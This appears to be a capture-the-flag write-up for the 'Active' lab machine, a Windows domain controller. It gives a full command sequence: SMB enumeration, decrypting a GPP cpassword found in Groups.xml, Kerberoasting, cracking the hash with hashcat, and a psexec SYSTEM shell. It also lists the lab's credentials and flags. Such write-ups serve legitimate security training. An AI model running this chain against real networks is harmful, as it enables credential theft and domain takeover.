# Active - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.100

sudo vim /etc/hosts
#add active.htb

smbclient -L \\\\active.htb

smbmap -H 10.10.10.100

smbclient \\\\active.htb\\Replication
#enumerate the share
#alternatively, we can use smbmap

smbmap -R Replication -H 10.10.10.100
#get the Groups.xml file

cat Groups.xml

gpp-decrypt <cpasswd value>
#this decrypts cpasswd

GetADUsers.py
#for getting AD users

GetADUsers.py active.htb/SVC_TGS -all -dc-ip 10.10.10.100

smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -H 10.10.10.100
#check access to smb shares

smbclient \\\\active.htb\\Users -U SVC_TGS
#check Users share
#get user flag from SVC_TGS Desktop

GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
#outputs ticket hash
#can be cracked using hashcat

hashcat -a 0 -m 13100 krbhash.txt /usr/share/wordlists/rockyou.txt
#cracks the hash

smbmap -u Administrator -p Ticketmaster1968 -d active.htb -H 10.10.10.100
#we have access to all shares as Administrator

#get shell as System
psexec.py active.htb/Administrator@10.10.10.100
#get root flag
```

* Open ports & services:

  * 53 - domain - MS DNS 6.1.7601
  * 88 - kerberos-sec - MS Windows Kerberos
  * 135 - msrpc - MS Windows RPC
  * 139 - netbios-ssn - MS Windows netbios-ssn
  * 389 - ldap - MS Windows AD LDAP
  * 593 - ncacn_http - MS Windows RPC over HTTP 1.0
  * 3268 - ldap - MS Windows AD LDAP
  * 5722 - msrpc - MS Windows RPC
  * 9389 - mc-nmf - .NET Message Framing
  * 47001 - http - Microsoft HTTPAPI httpd 2.0
  * 49158 - ncacn_http - MS Windows RPC over HTTP 1.0

* Using ```smbclient``` we can check the SMB shares - this shows 'Replication' and 'Users' shares, amongst others.

* ```smbmap``` shows that only 'Replication' share can be accessed (read-only).

* We can recursively list all contents of the 'Replication' share using ```smbmap```.

* Enumerating this 'Replication' share gives us a "Groups.xml" file in one of the subfolders in 'Policies' directory.

* This file is for the account name "active.htb\SVC_TGS" and it also includes the field ```cpasswd```.

* This password is related to GPP (Group Policy Preferences), and it can be decrypted using ```gpp-decrypt```.

* The decrypted password is "GPPstillStandingStrong2k18".

* To get AD users, we can use ```GetADUsers.py``` from ```impacket```.

* This gives us other users - Administrator, Guest, and krbtgt.

* We can also check for the 'SVC_TGS' account, if it has access to any other SMB shares.

* ```smbmap``` shows that we can now read the shares 'NETLOGON', 'Replication', 'SYSVOL' and 'Users'.

* Connecting to the Users share, we can get the user flag from the Desktop for SVC_TGS user.

* Now, as we have a ```Kerberos``` service running on port 88, we can attempt ```Kerberoasting```.

* Using ```GetUserSPNs.py``` from ```impacket```, we can request the ticket; it prints the ticket hash for Administrator.

* Now, this ticket hash can be cracked using ```hashcat```.

* ```hashcat``` cracks the hash and gives us the password.

* Using ```smbmap```, we can confirm that all shares can be accessed as Administrator using this cracked password.

* Therefore, we can use ```psexec.py``` to get shell as System and read root flag.

```markdown
1. User flag - e490f93d21e2e08a7762e2949470bd8b

2. Root flag - 0e43aa662e54778d3007482b044c9702
```
